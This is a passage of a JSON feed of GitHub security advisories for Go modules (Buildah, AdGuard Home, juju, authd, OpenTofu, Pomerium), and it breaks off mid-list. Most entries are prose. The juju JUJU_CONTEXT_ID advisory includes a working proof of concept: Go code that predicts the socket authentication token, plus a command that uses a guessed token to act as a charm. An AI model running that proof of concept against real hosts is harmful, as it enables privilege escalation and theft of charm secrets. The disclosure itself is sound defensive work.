{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability was found in Buildah. Cache mounts do not properly validate that user-specified paths for the cache are within our cache directory, allowing a <code>RUN</code> instruction in a Container file to mount an arbitrary directory from the host (read/write) into the container as long as those files can be accessed by the user running Buildah.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9675\">https://nvd.nist.gov/vuln/detail/CVE-2024-9675</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9675\">https://access.redhat.com/security/cve/CVE-2024-9675</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2317458\">https://bugzilla.redhat.com/show_bug.cgi?id=2317458</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-586p-749j-fhwp\">https://github.com/advisories/GHSA-586p-749j-fhwp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-586p-749j-fhwp",
            "title": "[github.com/containers/buildah] Buildah allows arbitrary directory mount",
            "date_modified": "2024-10-09T19:15:03.000Z",
            "date_published": "2024-10-09T15:32:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-586p-749j-fhwp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An arbitrary file read vulnerability in Adguard Home before v0.107.52 allows authenticated attackers to access arbitrary files as root on the underlying Operating System via placing a crafted file into a readable directory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36814\">https://nvd.nist.gov/vuln/detail/CVE-2024-36814</a></li>\n<li><a href=\"https://github.com/AdguardTeam/AdGuardHome\">https://github.com/AdguardTeam/AdGuardHome</a></li>\n<li><a href=\"https://github.com/AdguardTeam/AdGuardHome/blob/7c002e1a99b9b4e4a40e8c66851eda33e666d52d/internal/filtering/http.go#L23C1-L51C2\">https://github.com/AdguardTeam/AdGuardHome/blob/7c002e1a99b9b4e4a40e8c66851eda33e666d52d/internal/filtering/http.go#L23C1-L51C2</a></li>\n<li><a href=\"https://github.com/itz-d0dgy\">https://github.com/itz-d0dgy</a></li>\n<li><a href=\"https://happy-little-accidents.pages.dev/posts/CVE-2024-36814\">https://happy-little-accidents.pages.dev/posts/CVE-2024-36814</a></li>\n<li><a href=\"https://github.com/AdguardTeam/AdGuardHome/commit/e8fd4b187287a562cbe9018999e5ea576b4c7d68\">https://github.com/AdguardTeam/AdGuardHome/commit/e8fd4b187287a562cbe9018999e5ea576b4c7d68</a></li>\n<li><a href=\"https://github.com/AdguardTeam/AdGuardHome/releases/tag/v0.107.53\">https://github.com/AdguardTeam/AdGuardHome/releases/tag/v0.107.53</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9cp9-8gw2-8v7m\">https://github.com/advisories/GHSA-9cp9-8gw2-8v7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9cp9-8gw2-8v7m",
            "title": "[github.com/AdguardTeam/AdGuardHome] Adguard Home arbitrary file read vulnerability",
            "date_modified": "2024-10-08T22:30:53.000Z",
            "date_published": "2024-10-08T21:31:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9cp9-8gw2-8v7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An abstract UNIX domain socket responsible for introspection is available without authentication locally to any user with access to the network namespace where the local juju agent is running.</p>\n<p>On a juju controller agent, denial of service can be performed by using the <code>/leases/revoke</code> endpoint. Revoking leases in juju can cause availability issues.</p>\n<p>On a juju machine agent that is hosting units, disabling the unit component can be performed using the <code>/units</code> endpoint with a \"stop\" action.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patch: <a href=\"https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b\">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a>\nPatched in:</p>\n<ul>\n<li>3.5.4</li>\n<li>3.4.6</li>\n<li>3.3.7</li>\n<li>3.1.10</li>\n<li>2.9.51</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125\">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq\">https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8038\">https://nvd.nist.gov/vuln/detail/CVE-2024-8038</a></li>\n<li><a href=\"https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b\">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a></li>\n<li><a href=\"https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125\">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xwgj-vpm9-q2rq\">https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xwgj-vpm9-q2rq",
            "title": "[github.com/juju/juju] Vulnerable juju introspection abstract UNIX domain socket",
            "date_modified": "2024-10-03T16:53:27.000Z",
            "date_published": "2024-10-03T16:53:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xwgj-vpm9-q2rq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When combined with an attack of <code>JUJU_CONTEXT_ID</code>, any user on the local system with access to the default network namespace may connect to the <code>@/var/lib/juju/agents/unit-xxxx-yyyy/agent.socket</code> and perform actions that are normally reserved to a juju charm.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patch: <a href=\"https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206\">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a>\nPatched in:</p>\n<ul>\n<li>3.5.4</li>\n<li>3.4.6</li>\n<li>3.3.7</li>\n<li>3.1.10</li>\n<li>2.9.51</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workarounds available.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4\">GHSA-mh98-763h-m9v4</a>\n<a href=\"https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222\">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x\">https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x</a></li>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4\">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8037\">https://nvd.nist.gov/vuln/detail/CVE-2024-8037</a></li>\n<li><a href=\"https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206\">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a></li>\n<li><a href=\"https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222\">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8v4w-f4r9-7h6x\">https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8v4w-f4r9-7h6x",
            "title": "[github.com/juju/juju] Vulnerable juju hook tool abstract UNIX domain socket",
            "date_modified": "2024-10-03T16:53:21.000Z",
            "date_published": "2024-10-03T16:53:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8v4w-f4r9-7h6x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Authd PAM module up to version 0.3.4 can allow broker-managed users to impersonate any other user managed by the same broker and perform any PAM operation with it, including authenticating as them.</p>\n<p>This is possible using tools such as <code>su</code>, <code>sudo</code> or <code>ssh</code> (and potentially others) that, so far, do not ensure that the PAM user at the end of the transaction is matching the one who initiated the transaction.</p>\n<p>Authd 0.3.5 fixes this by not allowing changing the user unless it was never set before in the PAM stack.</p>\n<p><code>su</code> version that will include <a href=\"https://github.com/util-linux/util-linux/pull/3206\">https://github.com/util-linux/util-linux/pull/3206</a> will not be affected\n<code>ssh</code> version that will include <a href=\"https://github.com/openssh/openssh-portable/pull/521\">https://github.com/openssh/openssh-portable/pull/521</a> will not be affected\n<code>sudo</code> version that will include <a href=\"https://github.com/sudo-project/sudo/pull/412\">https://github.com/sudo-project/sudo/pull/412</a> will not be affected\n<code>login</code> not affected\n<code>passwd</code> not affected</p>\n<details>\n<summary>Old report</summary>\n\n<h3 id=\"summary\">Summary</h3>\n<p>An user can access as another user using its own credentials</p>\n<h3 id=\"details\">Details</h3>\n<p>I feel we’ve a security issue that is due to the fact that we allow changing the user in the cases in which that’s already provided by PAM, I’ve not tested this using the entra-id broker but it’s reproducible with the example one, but unless I’m missing something it should be independent from the broker in use.</p>\n<p>Basically, by going to the user selection page we allow to login as any user by entering the use own credentials.</p>\n<p>See for example: <a href=\"https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf\">https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf</a> or <a href=\"https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo\">https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo</a>  </p>\n<p>Basically it’s possible to logging in as <code>user1</code> using the credentials of <code>user2</code> or <code>user3</code>.</p>\n<p>The issue doesn’t affect login or passwd, but it does affect <code>su</code> and <code>sshd</code>, since in both cases they don’t check if the <code>PAM_USER</code> changed before the final authentication.</p>\n<p>Now, while those tools should likely be fixed to only read the PAM_USER once pam gave them the final ok, I think authd should not allow changing the user at all when it has been provided by PAM.</p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787\">https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9313\">https://nvd.nist.gov/vuln/detail/CVE-2024-9313</a></li>\n<li><a href=\"https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5\">https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-9313\">https://www.cve.org/CVERecord?id=CVE-2024-9313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x5q3-c8rm-w787\">https://github.com/advisories/GHSA-x5q3-c8rm-w787</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x5q3-c8rm-w787",
            "title": "[github.com/ubuntu/authd] PAM module may allow accessing with the credentials of another user",
            "date_modified": "2024-10-08T13:32:59.000Z",
            "date_published": "2024-10-03T16:53:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x5q3-c8rm-w787"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users who have opted into static evaluation of module sources, versions, and backend configurations may be at risk of exposing sensitive variables and locals.  This is a workflow that should not be possible and explicitly show errors.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Check that you are not using sensitive variables in module sources and versions, as well as backend configurations.  The patch will add explicit errors and prevent this from being possible.</p>\n<h3 id=\"examples\">Examples</h3>\n<pre><code class=\"language-hcl\">variable \"backend_path\" {\n        type = string\n        sensitive = true\n}\n\nterraform {\n        backend \"local\" {\n                path = var.backend_path\n        }\n}\n</code></pre>\n<pre><code class=\"language-hcl\">variable \"mod_info\" {\n        type = string\n        sensitive = true\n}\n\nmodule \"foo\" {\n        source = var.mod_info\n        //version = var.mod_info\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9\">https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wpr2-j6gr-pjw9\">https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wpr2-j6gr-pjw9",
            "title": "[github.com/opentofu/opentofu] OpenTofu potential leaking of secret variable values when using static evaluation in v1.8",
            "date_modified": "2024-10-03T16:51:51.000Z",
            "date_published": "2024-10-03T16:51:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wpr2-j6gr-pjw9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>JUJU_CONTEXT_ID</code> is the authentication measure on the unit hook tool abstract domain socket. It looks like <code>JUJU_CONTEXT_ID=appname/0-update-status-6073989428498739633</code>.</p>\n<p>This value looks fairly unpredictable, but due to the random source used, it is highly predictable.</p>\n<p><code>JUJU_CONTEXT_ID</code> has the following components:</p>\n<ul>\n<li>the application name</li>\n<li>the unit number</li>\n<li>the hook being currently run</li>\n<li>a uint63 decimal number</li>\n</ul>\n<p>On a system the application name and unit number can be deduced by reading the structure of the filesystem.\nThe current hook being run is not easily deduce-able, but is a limited set of possible values, so one could try them all.\nFinally the random number, this is generated from a non cryptographically secure random source. Specifically the random number generator built into the go standard library, using the current unix time in seconds (at startup) as the seed.</p>\n<p>There is no rate limiting on the abstract domain socket, the only limiting factor is time (window of time the hook is run) and memory (how much memory is available to facilitate all the connections).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>On a juju machine (non-kubernetes) or juju charm container (on kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the juju charm. This information could be secrets that give broader access.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patch: <a href=\"https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7\">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a>\nPatched in:</p>\n<ul>\n<li>3.5.4</li>\n<li>3.4.6</li>\n<li>3.3.7</li>\n<li>3.1.10</li>\n<li>2.9.51</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround. Upgrade will be required.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152\">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152</a>\n<a href=\"https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164\">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>With a contrived example, a charm that sleeps indefinitely on its first hook, install. This charm is called sleepy.</p>\n<pre><code>.\n|-- hooks\n|   `-- install\n#!/bin/sh\nsleep 10000\n|-- manifest.yaml\nbases:\n  - name: ubuntu\n    channel: 22.04/stable\n    architectures:\n      - amd64\n|-- metadata.yaml\nname: sleepy\nsummary: a sleepy charm\ndescription: a sleepy charm that sleeps on install\n`-- revision\n1\n</code></pre>\n<p>With sleepy deployed into a model, we have a unit with the name <code>sleepy/0</code> and an tag of <code>unit-sleepy-0</code>.</p>\n<p>With access to the log file we can very quickly get the start time of the unit:</p>\n<pre><code>ubuntu@juju-5e40c0-0:~$ cat /var/log/juju/unit-sleepy-0.log | grep 'unit \"sleepy/0\" started'\n2024-08-06 05:10:07 INFO juju.worker.uniter uniter.go:363 unit \"sleepy/0\" started\n</code></pre>\n<p>If we don't have access to the log, we could get pretty close by trying every second between when log file was created and now:</p>\n<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ cat unit-sleepy-0.log\ncat: unit-sleepy-0.log: Permission denied\nnobody@juju-5e40c0-0:/var/log/juju$ stat unit-sleepy-0.log\n  File: unit-sleepy-0.log\n  Size: 1403      \tBlocks: 8          IO Block: 4096   regular file\nDevice: 10302h/66306d\tInode: 25967076    Links: 1\nAccess: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)\nAccess: 2024-08-06 05:10:48.686975042 +0000\nModify: 2024-08-06 05:10:07.159133215 +0000\nChange: 2024-08-06 05:10:07.159133215 +0000\n Birth: 2024-08-06 05:10:06.965129276 +0000\n</code></pre>\n<p>We can then pass that into this program:</p>\n<pre><code>package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"math/rand\"\n    \"time\"\n)\n\nfunc main() {\n    var unitName string\n    var unitStartLogTime string\n    var currentHook string\n    flag.StringVar(&amp;unitName, \"u\", \"sleepy/0\", \"\")\n    flag.StringVar(&amp;unitStartLogTime, \"t\", \"2024-08-06 05:10:07\", \"time when the last 'INFO juju.worker.uniter uniter.go:363 unit %q started' log was written to /var/log/juju/unit-name-0.log\")\n    flag.StringVar(&amp;currentHook, \"h\", \"install\", \"the current hook that is running right now\")\n    flag.Parse()\n\n    t, err := time.Parse(\"2006-01-02 15:04:05\", unitStartLogTime)\n    if err != nil {\n        panic(err)\n    }\n\n    sources := []rand.Source{\n        rand.NewSource(t.Unix()),\n        rand.NewSource(t.Unix() - 1),\n        rand.NewSource(t.Unix() - 2),\n    }\n\n    for i := 0; i &lt; 10; i++ {\n        for _, source := range sources {\n            fmt.Printf(\"%s-%s-%d\\n\", unitName, currentHook, source.Int63())\n        }\n    }\n}\n</code></pre>\n<p>This program will give us a list of <code>JUJU_CONTEXT_ID</code>s to try. We just need to try each one. In this case it was the first one, because we had enough information.</p>\n<pre><code>$ go run . -u sleepy/0 -t \"2024-08-06 05:10:07\" -h install\nsleepy/0-install-7349430268617352851\nsleepy/0-install-2171542415131519293\nsleepy/0-install-6564961386023494624\nsleepy/0-install-59904244413115609\nsleepy/0-install-6073989428498739633\nsleepy/0-install-2504995199508561544\nsleepy/0-install-1526670560532335303\nsleepy/0-install-2568216045630615950\nsleepy/0-install-8047402353801897930\n</code></pre>\n<p>Unfortunately, this worked too well.</p>\n<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-sleepy-0/agent.socket JUJU_CONTEXT_ID=sleepy/0-install-7349430268617352851 /var/lib/juju/tools/unit-sleepy-0/is-leader\nTrue\n</code></pre>\n<p>With a more sophisticated attack, this could discover all the units on the machine, using the update-status hook, try a few thousand attempts per second to guess the start time and the current offset in the random source, then using secret-get hook tool, get some sort of secret, such as credentials to a system.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4\">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-7558\">https://nvd.nist.gov/vuln/detail/CVE-2024-7558</a></li>\n<li><a href=\"https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7\">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh98-763h-m9v4\">https://github.com/advisories/GHSA-mh98-763h-m9v4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh98-763h-m9v4",
            "title": "[github.com/juju/juju] JUJU_CONTEXT_ID is a predictable authentication secret",
            "date_modified": "2024-10-03T16:50:00.000Z",
            "date_published": "2024-10-03T16:49:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh98-763h-m9v4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-xwgj-vpm9-q2rq. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Vulnerable juju introspection abstract UNIX domain socket. An abstract UNIX domain socket responsible for introspection is available without authentication locally to network namespace users. This enables denial of service attacks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq\">https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8038\">https://nvd.nist.gov/vuln/detail/CVE-2024-8038</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-8038\">https://www.cve.org/CVERecord?id=CVE-2024-8038</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-85qf-6845-m8p2\">https://github.com/advisories/GHSA-85qf-6845-m8p2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-85qf-6845-m8p2",
            "title": "[github.com/juju/juju] Duplicate Advisory: Juju Unprotected Alternate Channel vulnerability",
            "date_modified": "2024-10-02T21:55:52.000Z",
            "date_published": "2024-10-02T12:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-85qf-6845-m8p2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-8v4w-f4r9-7h6x. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Vulnerable juju hook tool abstract UNIX domain socket. When combined with an attack of JUJU_CONTEXT_ID, any user on the local system with access to the default network namespace may connect to the @/var/lib/juju/agents/unit-xxxx-yyyy/agent.socket and perform actions that are normally reserved to a juju charm.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x\">https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8037\">https://nvd.nist.gov/vuln/detail/CVE-2024-8037</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-8037\">https://www.cve.org/CVERecord?id=CVE-2024-8037</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fc27-7pf5-96v3\">https://github.com/advisories/GHSA-fc27-7pf5-96v3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fc27-7pf5-96v3",
            "title": "[github.com/juju/juju] Duplicate Advisory: Vulnerable juju hook tool abstract UNIX domain socket",
            "date_modified": "2024-10-02T21:55:49.000Z",
            "date_published": "2024-10-02T12:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fc27-7pf5-96v3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-mh98-763h-m9v4. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>JUJU_CONTEXT_ID is a predictable authentication secret. On a Juju machine (non-Kubernetes) or Juju charm container (on Kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the Juju charm.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4\">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-7558\">https://nvd.nist.gov/vuln/detail/CVE-2024-7558</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-7558\">https://www.cve.org/CVERecord?id=CVE-2024-7558</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phh4-3hmm-24rx\">https://github.com/advisories/GHSA-phh4-3hmm-24rx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phh4-3hmm-24rx",
            "title": "[github.com/juju/juju] Duplicate Advisory: Juju makes Use of Weak Credentials",
            "date_modified": "2024-10-02T21:55:44.000Z",
            "date_published": "2024-10-02T12:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phh4-3hmm-24rx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>We've identified a vulnerability in the Pomerium databroker service API that may grant unintended access under specific conditions. This affects only certain Pomerium Zero and Pomerium Enterprise deployments.</p>\n<h4 id=\"who-is-affected\">Who is affected?</h4>\n<p>A Pomerium deployment is susceptible to this issue if <em>all</em> of the following conditions are met:</p>\n<ul>\n<li>You have issued a <a href=\"https://www.pomerium.com/docs/capabilities/service-accounts\">service account</a> access token using Pomerium Zero or Pomerium Enterprise.</li>\n<li>The access token has an explicit expiration date in the future.</li>\n<li>The core Pomerium databroker gRPC API is not otherwise secured by network access controls.</li>\n</ul>\n<p>If your deployment does not meet <em>all</em> of these conditions, you are not affected by this vulnerability.</p>\n<h4 id=\"details\">Details</h4>\n<p>The Pomerium databroker service is responsible for managing all persistent Pomerium application state. Requests to the databroker service API are authorized by the presence of a JSON Web Token (JWT) signed by a key known by all Pomerium services in the same deployment. However, incomplete validation of this JWT meant that some service account access tokens would incorrectly be treated as valid for the purpose of databroker API authorization.</p>\n<p>Improper access to the databroker API could allow exfiltration of user info, spoofing of user sessions, or tampering with Pomerium routes, policies, and other settings.</p>\n<h4 id=\"discovery\">Discovery</h4>\n<p>This issue was discovered during internal review. At this time we have no evidence to suggest that this vulnerability has been exploited in the wild.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have released <a href=\"https://github.com/pomerium/pomerium/releases/tag/v0.27.1\">Pomerium v0.27.1</a> which includes a fix for the JWT validation logic. All affected users are strongly encouraged to upgrade to this version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade immediately, consider the following mitigations:</p>\n<ul>\n<li><p>Network access controls: Restrict access to the Pomerium internal gRPC API by configuring your network firewall or security groups to limit access to trusted sources only. Ensure that the port specified in the <a href=\"https://www.pomerium.com/docs/reference/grpc#grpc-address\"><code>grpc_address</code></a> setting is not exposed to unauthorized networks.</p>\n</li>\n<li><p><em>For Pomerium Zero deployments only:</em> As of Pomerium v0.26.0, you can disable the gRPC API listener by setting <code>grpc_address: \"\"</code> in your YAML configuration file. In all-in-one mode, Pomerium does not require the internal gRPC API to be exposed beyond localhost.</p>\n</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have questions or need further assistance:</p>\n<ul>\n<li>Open an issue in the <a href=\"https://github.com/pomerium/pomerium/issues\">pomerium/pomerium</a> repository.</li>\n<li>Contact us at <a href=\"mailto:security@pomerium.com\">security@pomerium.com</a>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pomerium/pomerium/security/advisories/GHSA-r7rh-jww5-5fjr\">https://github.com/pomerium/pomerium/security/advisories/GHSA-r7rh-jww5-5fjr</a></li>\n<li><a href=\"https://github.com/pomerium/pomerium/commit/e018cf0fc0979d2abe25ff705db019feb7523444\">https://github.com/pomerium/pomerium/commit/e018cf0fc0979d2abe25ff705db019feb7523444</a></li>\n<li><a href=\"https://github.com/pomerium/pomerium/releases/tag/v0.27.1\">https://github.com/pomerium/pomerium/releases/tag/v0.27.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47616\">https://nvd.nist.gov/vuln/detail/CVE-2024-47616</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7rh-jww5-5fjr\">https://github.com/advisories/GHSA-r7rh-jww5-5fjr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7rh-jww5-5fjr",
            "title": "[github.com/pomerium/pomerium] Pomerium service account access token may grant unintended access to databroker API",
            "date_modified": "2024-10-03T13:26:20.000Z",
            "date_published": "2024-10-02T21:33:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7rh-jww5-5fjr"
            },
            "tags": [
                "severity"
            ]
        },
        {
